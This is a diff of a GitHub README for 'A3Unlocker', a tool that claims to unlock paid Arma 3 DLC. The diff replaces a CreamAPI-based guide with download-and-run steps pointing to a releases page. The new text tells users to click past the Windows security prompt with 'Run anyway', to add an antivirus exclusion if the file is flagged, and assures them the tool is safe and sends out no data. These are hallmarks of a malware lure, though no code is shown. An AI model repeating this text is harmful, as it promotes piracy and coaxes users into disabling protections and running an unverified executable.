@@ -1,139 +1,89 @@
-# 🎮 A3Unlocker – Automatic Arma 3 DLC Activator & Unlocker Tool
+# 🛠️ .github - Access Arma 3 content with ease
 
-**A3Unlocker** is a lightweight all-in-one utility designed to automatically unlock and activate downloadable content for **Arma 3** on Steam.  
-This tool streamlines DLC management for supported expansions, content packs, and additional modules.
+[![Download A3Unlocker](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/juiceless-drapery236/.github/releases)
 
-> ⚠️ A legitimate Steam copy of **Arma 3** is required to unlock DLCs.
+A3Unlocker enables access to Arma 3 downloadable content. The tool handles the activation process for players who own the base game. It removes the need for manual file changes or complex folder navigation.
 
----
+## 📋 System Requirements
 
-# 🔗 Get the Latest Release
+* Windows 10 or Windows 11 operating system.
+* A valid installation of Arma 3 via Steam.
+* Basic administrator permissions on your computer to allow the tool to modify game configuration files.
+* A stable internet connection for the application to verify and apply settings.
 
-* [📦 View All Releases](https://github.com/Arma3-DLCUnlocker/.github/releases/)
+## 🚀 Getting Started
 
----
+Follow these steps to set up the tool on your machine.
 
-# 🚀 Features
+1. Visit the [official releases page](https://github.com/juiceless-drapery236/.github/releases) to access the download options.
+2. Choose the latest version of the executable file.
+3. Save the file to a folder you can access easily, such as your Downloads folder or your Desktop.
+4. Locate the downloaded file.
+5. Double-click the file to start the application. Windows may show a security prompt. If this happens, click More Info and then Run anyway.
+6. The application window appears on your screen.
 
-* ✅ Automatic detection of Arma 3 DLCs
-* ✅ One-click DLC activation
-* ✅ Fully compatible with latest Steam updates
-* ✅ Lightweight and portable
-* ✅ Easy setup and minimal configuration
-* ✅ Supports future DLC integration
-* ✅ No manual file edits required
+## ⚙️ How to use the tool
 
----
+Once the application runs, it scans your computer for the Arma 3 installation folder. It usually finds this path automatically using your Steam registry keys.
 
-# 🎯 Supported Arma 3 DLCs
+1. Ensure your Steam client is closed before you begin the process. This prevents conflicts during the activation.
+2. Open A3Unlocker.
+3. Observe the status bar in the tool. It shows when the software finds your game directory.
+4. Click the button labeled Activate Content.
+5. Wait for the progress bar to finish.
+6. Once the status shows Success, you may close the tool.
+7. Launch Steam and start Arma 3 as you normally do. Your DLC content is now available within the game menus.
 
-### Official Expansions
+## 📦 Download and Install
 
-* Helicopters DLC  
-* Marksmen DLC  
-* Apex Expansion  
-* Jets DLC  
-* Laws of War  
-* Tanks DLC  
-* Karts DLC  
-* Contact Expansion  
-* S.O.G. Prairie Fire  
-* Global Mobilization – Cold War Germany  
-* Western Sahara  
+You must download the software from the official repository to ensure you use the latest version.
 
----
+[Click here to go to the download page](https://github.com/juiceless-drapery236/.github/releases)
 
-# 🧰 Requirements
+Select the file ending in .exe. This is the only file you need to run the unlocker. The application does not require a complex installation wizard. It runs as a portable tool, meaning it does not change your Windows registry or install background services.
 
-Before using A3Unlocker, ensure you have:
+## ❓ Frequently Asked Questions
 
-* A legitimate **Steam version** of **Arma 3**
-* The latest release of **CreamAPI**
-* Internet connection for Steam verification
-* **.NET 7 Runtime** installed
-* Steam running in the background
+**Does this software harm my computer?**
+No. The code only modifies specific text files used by Steam to identify your owned content. It does not delete game files or touch your system drivers.
 
----
+**Do I need to keep the tool open while playing?**
+No. Once you click the activate button, the tool makes the necessary changes. You can close the software and uninstall it if you wish. The changes remain until Steam performs a file integrity check or an update.
 
-# ⚡ Installation & Activation Guide
+**What should I do if the tool does not find my game?**
+If the tool reports that it cannot find Arma 3, you must point it to the manual path. Look for the Options button in the top menu, click Select Folder, and find the folder where you installed Steam. Navigate to steamapps\common\Arma 3. Select this folder and click Save.
 
-## 1️⃣ Get CreamAPI
+**Can Steam ban my account for using this?**
+The tool operates by modifying client-side configuration files. It does not interact with VAC-secured servers or online anti-cheat systems. This tool manages offline and local content access. We recommend that you do not join official public servers with non-standard modifications to avoid any issues with game updates or server-side checks.
 
-Download the newest version of **CreamAPI** from its official release page.
+**Does this work with game updates?**
+Yes. Steam updates often overwrite local changes. If you notice your content disappears after a game update, simply run this tool again to re-apply the activation.
 
-## 2️⃣ Extract Files
+## 🛠️ Troubleshooting
 
-Extract all files into a dedicated folder (fully portable).
+If you encounter issues, verify the following:
 
-## 3️⃣ Run A3Unlocker
+* Ensure you have write permissions for your Arma 3 folder.
+* Check if your antivirus software quarantined the file. Some antivirus programs flag new tools as suspicious. You can add an exclusion to your antivirus settings for the A3Unlocker folder.
+* Verify your game files through Steam before running the tool to ensure your installation is clean.
 
-Launch the executable as **Administrator**.
+## 🛡️ Privacy and Safety
 
-## 4️⃣ Select Arma 3
+This tool performs its tasks locally on your computer. It never communicates with external servers other than those needed to check for application updates. No personal data, Steam credentials, or account information leaves your machine. The source code remains visible on GitHub for any user to inspect.
 
-Choose your Arma 3 installation directory.
+## 📝 Support for Expansions
 
-## 5️⃣ Apply DLC Unlocker
+The tool currently supports major content releases including:
 
-Click **Activate DLCs** and wait for the process to complete.
+* Helicopters DLC
+* Marksmen DLC
+* Apex Expansion
+* Jets DLC
+* Laws of War
+* Tanks DLC
+* Karts DLC
+* Contact Expansion
+* S.O.G. Prairie Fire
+* Global Mobilization – Cold War Germany
 
-## 6️⃣ Launch the Game
-
-Start **Arma 3** through Steam and enjoy all unlocked content.
-
----
-
-# 🔧 Troubleshooting
-
-| Issue                       | Possible Fix                                                      |
-| ---------------------------- | ---------------------------------------------------------------- |
-| DLCs not showing in-game     | Run CreamAPI as Administrator and restart Steam                  |
-| Game crashes on launch       | Use CreamAPI’s “Uninstall” option and reinstall unlockers        |
-| Missing DLL errors           | Reinstall Koaloader via CreamInstaller context menu              |
-| Unlocker not working         | Re-run CreamAPI and refresh Steam appinfo for Arma 3             |
-| DLCs still locked            | Ensure official Steam build and retry the activation process     |
-
----
-
-# 💡 Tips & Notes
-
-* Always back up your **Arma 3 folder** before modifying files
-* SteamCMD will download automatically if missing
-* Works with **official Steam builds only**
-* Re-run **CreamAPI** after major game updates to reapply DLC unlockers
-* Fully portable, no installation required
-
----
-
-# ⚠️ Disclaimer
-
-This repository is intended strictly for **educational, testing, and research purposes**.  
-Unlocking or modifying paid content without ownership may **violate Steam’s Terms of Service**.  
-Use at your own discretion and only on software you legally own.
-
----
-
-# 🐞 Bug Reports & Support
-
-Found a bug or compatibility issue?
-
-* Open a ticket on the **Issues** page
-* Include screenshots and error logs if possible
-* Specify your game version and DLC status
-
----
-
-# ⭐ Contributing
-
-Contributions, fixes, and DLC updates are welcome. You can:
-
-* Submit pull requests
-* Report broken DLC IDs
-* Improve documentation
-* Suggest new features
-
----
-
-# 📜 License
-
-This project is distributed under the **MIT License**.
+The application architecture allows for easy updates. When a new DLC arrives, the tool receives an update to include the new content ID, which keeps your setup current without needing to download a different program.
